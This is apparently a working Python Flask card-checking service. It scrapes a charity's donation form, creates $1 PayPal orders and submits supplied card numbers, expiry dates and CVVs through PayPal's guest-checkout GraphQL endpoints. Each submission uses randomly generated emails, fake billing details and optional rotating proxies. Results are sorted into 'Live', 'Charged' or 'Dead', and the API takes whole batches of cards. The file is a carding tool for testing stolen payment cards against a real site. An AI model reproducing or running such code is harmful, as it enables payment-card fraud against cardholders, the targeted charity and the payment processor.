from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import re
import random
import string
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# Configuration
USE_PROXY = False
PROXY_LIST = []
TIMEOUT = 30
MAX_RETRIES = 2

def generate_email():
    domains = ["gmail.com", "outlook.com", "yahoo.com", "protonmail.com", "hotmail.com"]
    name = ''.join(random.choices(string.ascii_lowercase, k=12))
    return f"{name}@{random.choice(domains)}"

def get_proxy():
    if USE_PROXY and PROXY_LIST:
        proxy = random.choice(PROXY_LIST)
        return {'http': proxy, 'https': proxy}
    return None

def check_card(card_data):
    """
    Check a credit card via PayPal
    """
    try:
        cc = card_data.get('cc', '').strip()
        mm = card_data.get('mm', '').strip()
        yy = card_data.get('yy', '').strip()
        cvv = card_data.get('cvv', '').strip()
        
        if not all([cc, mm, yy, cvv]):
            return {'status': False, 'response': 'Missing card details', 'result': 'Error'}
        
        if len(yy) == 2:
            yy = "20" + yy
            
        email = generate_email()
        s = requests.session()
        
        if USE_PROXY and PROXY_LIST:
            s.proxies = get_proxy()
        
        s.timeout = TIMEOUT

        # Step 1: Get form hash
        headers = {
            'host': 'mylifebloom.co',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="148", "Android WebView";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'dnt': '1',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'none',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=0, i',
        }

        response = s.get('https://mylifebloom.co/donations/support-the-lifebloom-cause/', headers=headers)
        hash_match = re.search(r'name="give-form-hash".*?value="([^"]+)"', response.text)
        if not hash_match:
            return {'status': False, 'response': 'Failed to extract form hash', 'result': 'Error'}
        form_hash = hash_match.group(1)

        # Step 2: Create PayPal order
        files = {
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, '264-1'),
            'give-form-id': (None, '264'),
            'give-form-title': (None, 'Support the LifeBloom Cause'),
            'give-current-url': (None, 'https://mylifebloom.co/donations/support-the-lifebloom-cause/'),
            'give-form-url': (None, 'https://mylifebloom.co/donations/support-the-lifebloom-cause/'),
            'give-form-minimum': (None, '1.00'),
            'give-form-maximum': (None, '100000.00'),
            'give-form-hash': (None, form_hash),
            'give-price-id': (None, '0'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'hsjsjs'),
            'give_last': (None, 'jwjwhwhw'),
            'give_email': (None, email),
            'give_agree_to_terms': (None, '1'),
            'give-gateway': (None, 'paypal-commerce'),
        }

        headers = {
            'host': 'mylifebloom.co',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="148", "Android WebView";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'accept': '*/*',
            'origin': 'https://mylifebloom.co',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://mylifebloom.co/donations/support-the-lifebloom-cause/',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i',
        }

        params = {'action': 'give_paypal_commerce_create_order'}

        response = s.post(
            'https://mylifebloom.co/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            files=files,
        )

        resp_json = response.json()
        order_id = resp_json['data']['id']

        # Step 3: Get checkout details
        headers = {
            'host': 'www.paypal.com',
            'sec-ch-ua-platform': '"Android"',
            'x-app-name': 'smart-payment-buttons',
            'paypal-client-context': '72N97200JN196742V',
            'sec-ch-ua': '"Chromium";v="148", "Android WebView";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'disable-set-cookie': 'true',
            'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'sec-fetch-storage-access': 'active',
            'referer': 'https://www.paypal.com/',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i',
        }

        json_data = {
            'query': '\n        query GetCheckoutDetails($orderID: String!) {\n            checkoutSession(token: $orderID) {\n                cart {\n                    billingType\n                    productCode\n                    intent\n                    paymentId\n                    billingToken\n                    amounts {\n                        total {\n                            currencyValue\n                            currencyCode\n                            currencyFormatSymbolISOCurrency\n                        }\n                    }\n                    supplementary {\n                        initiationIntent\n                    }\n                    category\n                }\n                flags {\n                    isChangeShippingAddressAllowed\n                }\n                payees {\n                    merchantId\n                    email {\n                        stringValue\n                    }\n                }\n            }\n        }\n        ',
            'variables': {'orderID': order_id},
        }

        s.post('https://www.paypal.com/graphql?GetCheckoutDetails', headers=headers, json=json_data)

        # Step 4: Update client config
        json_data = {
            'query': '\n            mutation UpdateClientConfig(\n                $orderID : String!,\n                $fundingSource : ButtonFundingSourceType!,\n                $integrationArtifact : IntegrationArtifactType!,\n                $userExperienceFlow : UserExperienceFlowType!,\n                $productFlow : ProductFlowType,\n                $buttonSessionID : String\n            ) {\n                updateClientConfig(\n                    token: $orderID,\n                    fundingSource: $fundingSource,\n                    integrationArtifact: $integrationArtifact,\n                    userExperienceFlow: $userExperienceFlow,\n                    productFlow: $productFlow,\n                    buttonSessionID: $buttonSessionID\n                )\n            }\n        ',
            'variables': {
                'orderID': order_id,
                'fundingSource': 'card',
                'integrationArtifact': 'PAYPAL_JS_SDK',
                'userExperienceFlow': 'INLINE',
                'productFlow': 'SMART_PAYMENT_BUTTONS',
            },
        }

        s.post('https://www.paypal.com/graphql?UpdateClientConfig', headers=headers, json=json_data)

        # Step 5: Get card fields
        headers = {
            'host': 'www.paypal.com',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-storage-access': 'active',
            'referer': 'https://www.paypal.com/',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=0, i',
        }

        params = {
            'token': order_id,
            'sessionID': 'uid_b44f7ace06_mty6ntm6mta',
            'buttonSessionID': 'uid_a70d97da70_mty6ntm6mta',
            'locale.x': 'tr_TR',
            'commit': 'true',
            'style.submitButton.display': 'true',
            'hasShippingCallback': 'false',
            'env': 'production',
            'country.x': 'TR',
            'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9pbnRlbnQ9Y2FwdHVyZSZ2YXVsdD1mYWxzZSZjdXJyZW5jeT1VU0QmY2xpZW50LWlkPUJBQU5ReThqeXo5aWMtbVJhTVQzTVY1cDFlWHBRMXZjakI5cTVGWE5rU0dMN1RxTV8ybHpROXBRRGNVSWxqMVhZb0RwZUZuUnZkU2ltVEQ1REUmZGlzYWJsZS1mdW5kaW5nPWNyZWRpdCZjb21wb25lbnRzPWJ1dHRvbnMmZW5hYmxlLWZ1bmRpbmc9dmVubW8iLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJHaXZlV1BfU1BfUFBDUFYyIiwiZGF0YS11aWQiOiJ1aWRfaXNzY2hqcmpybmVvYXdld2llenJ5Y2lxaWNzaWxsIn19',
            'disable-card': '',
        }

        s.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers)

        # Step 6: Currency conversion check
        headers = {
            'host': 'www.paypal.com',
            'sec-ch-ua-platform': '"Android"',
            'paypal-client-context': '72N97200JN196742V',
            'x-app-name': 'standardcardfields',
            'sec-ch-ua': '"Chromium";v="148", "Android WebView";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'paypal-client-metadata-id': '72N97200JN196742V',
            'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
            'x-country': 'TR',
            'content-type': 'application/json',
            'accept': '*/*',
            'origin': 'https://www.paypal.com',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'sec-fetch-storage-access': 'active',
            'referer': f'https://www.paypal.com/smart/card-fields?token={order_id}&sessionID=uid_b44f7ace06_mty6ntm6mta&buttonSessionID=uid_a70d97da70_mty6ntm6mta&locale.x=tr_TR&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=TR&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9pbnRlbnQ9Y2FwdHVyZSZ2YXVsdD1mYWxzZSZjdXJyZW5jeT1VU0QmY2xpZW50LWlkPUJBQU5ReThqeXo5aWMtbVJhTVQzTVY1cDFlWHBRMXZjakI5cTVGWE5rU0dMN1RxTV8ybHpROXBRRGNVSWxqMVhZb0RwZUZuUnZkU2ltVEQ1REUmZGlzYWJsZS1mdW5kaW5nPWNyZWRpdCZjb21wb25lbnRzPWJ1dHRvbnMmZW5hYmxlLWZ1bmRpbmc9dmVubW8iLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJHaXZlV1BfU1BfUFBDUFYyIiwiZGF0YS11aWQiOiJ1aWRfaXNzY2hqcmpybmVvYXdld2llenJ5Y2lxaWNzaWxsIn19&disable-card=',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i',
        }

        json_data = {
            'query': '\n              query (\n                $countryCode: CountryCodes,\n                $ecToken: String!\n              ) {\n                checkoutSession(token: $ecToken) {\n                  cart(country: $countryCode){\n                    totalAllowedOverCaptureAmount {\n                      currencyFormatSymbolISOCurrency\n                    }\n                  }\n                }\n              }\n        ',
            'variables': {
                'billingCountry': 'TR',
                'ecToken': order_id,
            },
            'operationName': None,
        }

        s.post('https://www.paypal.com/graphql?total_allowed_overcapture_amount_tr', headers=headers, json=json_data)

        # Step 7: Currency conversion
        json_data = {
            'query': '\n          query ($cardNumber: String!, $token: String!) {\n            currencyConversionFromCreditCard(cardNumber: $cardNumber, token: $token) {\n                spread\n                rateFormatted\n                to {\n                  currencySymbol\n                  currencyCode\n                  currencyFormatSymbolISOCurrency\n                }\n                from {\n                  currencySymbol\n                  currencyCode\n                  currencyFormatSymbolISOCurrency\n                }\n                feeRate\n            }\n          }\n        ',
            'variables': {
                'cardNumber': cc,
                'token': order_id,
            },
            'operationName': None,
        }

        s.post('https://www.paypal.com/graphql?fetch_currency_conversion', headers=headers, json=json_data)

        # Step 8: Final payment request
        headers = {
            'host': 'www.paypal.com',
            'sec-ch-ua-platform': '"Android"',
            'paypal-client-context': order_id,
            'x-app-name': 'standardcardfields',
            'sec-ch-ua': '"Chromium";v="148", "Android WebView";v="148", "Not/A)Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'paypal-client-metadata-id': '72N97200JN196742V',
            'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2409BRN2CA Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7778.178 Mobile Safari/537.36',
            'x-country': 'TR',
            'content-type': 'application/json',
            'accept': '*/*',
            'origin': 'https://www.paypal.com',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'sec-fetch-storage-access': 'active',
            'referer': f'https://www.paypal.com/smart/card-fields?token={order_id}&sessionID=uid_b44f7ace06_mty6ntm6mta&buttonSessionID=uid_a70d97da70_mty6ntm6mta&locale.x=tr_TR&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=TR&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9pbnRlbnQ9Y2FwdHVyZSZ2YXVsdD1mYWxzZSZjdXJyZW5jeT1VU0QmY2xpZW50LWlkPUJBQU5ReThqeXo5aWMtbVJhTVQzTVY1cDFlWHBRMXZjakI5cTVGWE5rU0dMN1RxTV8ybHpROXBRRGNVSWxqMVhZb0RwZUZuUnZkU2ltVEQ1REUmZGlzYWJsZS1mdW5kaW5nPWNyZWRpdCZjb21wb25lbnRzPWJ1dHRvbnMmZW5hYmxlLWZ1bmRpbmc9dmVubW8iLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJHaXZlV1BfU1BfUFBDUFYyIiwiZGF0YS11aWQiOiJ1aWRfaXNzY2hqcmpybmVvYXdld2llenJ5Y2lxaWNzaWxsIn19&disable-card=',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i',
        }

        json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': order_id,
                'card': {
                    'cardNumber': cc,
                    'type': 'MASTER_CARD',
                    'expirationDate': f'{mm}/{yy}',
                    'postalCode': '27000',
                    'securityCode': cvv,
                },
                'phoneNumber': '5356431233',
                'firstName': 'obama',
                'lastName': 'smith',
                'billingAddress': {
                    'givenName': 'obama',
                    'familyName': 'smith',
                    'line1': 'sreet 62727',
                    'line2': None,
                    'city': 'adana',
                    'state': 'adana',
                    'postalCode': '27000',
                    'country': 'TR',
                },
                'shippingAddress': {
                    'givenName': 'obama',
                    'familyName': 'smith',
                    'line1': 'sreet 62727',
                    'line2': None,
                    'city': 'adana',
                    'state': 'adana',
                    'postalCode': '27000',
                    'country': 'TR',
                },
                'email': email,
                'currencyConversionType': 'PAYPAL',
            },
            'operationName': 'payWithCard',
        }

        response = s.post('https://www.paypal.com/graphql?paywithcard', headers=headers, json=json_data)
        response3 = response.json()

        # Step 9: Parse response
        lives = [
            "INVALID_SECURITY_CODE",
            "INVALID_BILLING_ADDRESS",
            "EXISTING_ACCOUNT_RESTRICTED",
            "is3DSecureRequired",
        ]

        if "errors" in response3 and response3["errors"]:
            error_msg = response3["errors"][0]

            if "data" in error_msg and error_msg["data"]:
                if isinstance(error_msg["data"], list) and len(error_msg["data"]) > 0:
                    field_error = error_msg["data"][0]
                    code = field_error.get("code", "")
                    cash = code
                elif isinstance(error_msg["data"], dict):
                    code = error_msg["data"].get("error", "")
                    cash = code if code else error_msg.get("message", "Unknown error")
                else:
                    cash = error_msg.get("message", "Unknown error")
            else:
                cash = error_msg.get("message", "Unknown error")

        elif response3.get("data", {}).get("approveGuestPaymentWithCreditCard"):
            approve_data = response3["data"]["approveGuestPaymentWithCreditCard"]
            flags = approve_data.get("flags", {})

            if flags.get("is3DSecureRequired"):
                cash = "is3DSecureRequired"
            else:
                cash = "Approved!"
        else:
            cash = "noseidk"

        # Step 10: Determine status
        if any(live_code in cash for live_code in lives):
            status = "Live"
        elif "Approved" in cash:
            status = "Charged"
        elif "INVALID_RESOURCE_ID" in cash:
            status = "Retry"
            cash = "Invalid Token"
        else:
            status = "Dead"

        return {'status': True, 'response': cash, 'result': status}

    except Exception as error:
        logger.error(f"Error in check_card: {str(error)}")
        return {'status': False, 'response': f'Exception -> {str(error)}', 'result': 'Error'}

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'proxies_enabled': USE_PROXY,
        'proxy_count': len(PROXY_LIST) if PROXY_LIST else 0,
        'api_version': '1.0.0'
    })

@app.route('/check', methods=['POST', 'GET'])
def check_card_api():
    """
    API endpoint to check credit cards via PayPal
    
    POST /check with JSON:
    {
        "card": "4111111111111111|12|2026|123"
    }
    OR
    {
        "cc": "4111111111111111",
        "mm": "12",
        "yy": "2026",
        "cvv": "123"
    }
    OR
    {
        "cards": ["card1|format", "card2|format"]
    }
    
    GET /check?card=4111111111111111|12|2026|123
    GET /check?cc=4111111111111111&mm=12&yy=2026&cvv=123
    """
    try:
        data = None
        
        if request.method == 'GET':
            card = request.args.get('card')
            cc = request.args.get('cc')
            mm = request.args.get('mm')
            yy = request.args.get('yy')
            cvv = request.args.get('cvv')
            
            if card:
                data = {'card': card}
            elif all([cc, mm, yy, cvv]):
                data = {
                    'cc': cc,
                    'mm': mm,
                    'yy': yy,
                    'cvv': cvv
                }
            else:
                return jsonify({
                    'status': False,
                    'error': 'Missing parameters',
                    'message': 'Use: ?card=CC|MM|YY|CVV or ?cc=...&mm=...&yy=...&cvv=...'
                }), 400
        else:
            data = request.get_json()
        
        if not data:
            return jsonify({
                'status': False,
                'error': 'No data provided',
                'message': 'Please send a JSON payload or query parameters'
            }), 400
        
        # Handle single card with pipe format
        if 'card' in data:
            card_parts = data['card'].strip().split('|')
            if len(card_parts) >= 4:
                card_data = {
                    'cc': card_parts[0].strip(),
                    'mm': card_parts[1].strip(),
                    'yy': card_parts[2].strip(),
                    'cvv': card_parts[3].strip()
                }
            else:
                return jsonify({
                    'status': False,
                    'error': 'Invalid card format',
                    'message': 'Expected format: CC|MM|YY|CVV'
                }), 400
        
        # Handle individual card fields
        elif all(k in data for k in ['cc', 'mm', 'yy', 'cvv']):
            card_data = {
                'cc': data['cc'].strip(),
                'mm': data['mm'].strip(),
                'yy': data['yy'].strip(),
                'cvv': data['cvv'].strip()
            }
        
        # Handle multiple cards
        elif 'cards' in data and isinstance(data['cards'], list):
            results = []
            for card_str in data['cards']:
                card_parts = card_str.strip().split('|')
                if len(card_parts) >= 4:
                    card_data = {
                        'cc': card_parts[0].strip(),
                        'mm': card_parts[1].strip(),
                        'yy': card_parts[2].strip(),
                        'cvv': card_parts[3].strip()
                    }
                    result = check_card(card_data)
                    results.append({
                        'card': card_str,
                        'result': result
                    })
                else:
                    results.append({
                        'card': card_str,
                        'result': {
                            'status': False,
                            'response': 'Invalid card format',
                            'result': 'Error'
                        }
                    })
            
            return jsonify({
                'status': True,
                'total_checked': len(results),
                'results': results
            })
        
        else:
            return jsonify({
                'status': False,
                'error': 'Invalid request',
                'message': 'Provide either "card", "cc/mm/yy/cvv", or "cards" array'
            }), 400
        
        # Check single card
        result = check_card(card_data)
        
        return jsonify({
            'status': True,
            'card': f"{card_data['cc']}|{card_data['mm']}|{card_data['yy']}|{card_data['cvv']}",
            'result': result
        })
        
    except Exception as e:
        logger.error(f"API error: {str(e)}")
        return jsonify({
            'status': False,
            'error': 'Server error',
            'message': str(e)
        }), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
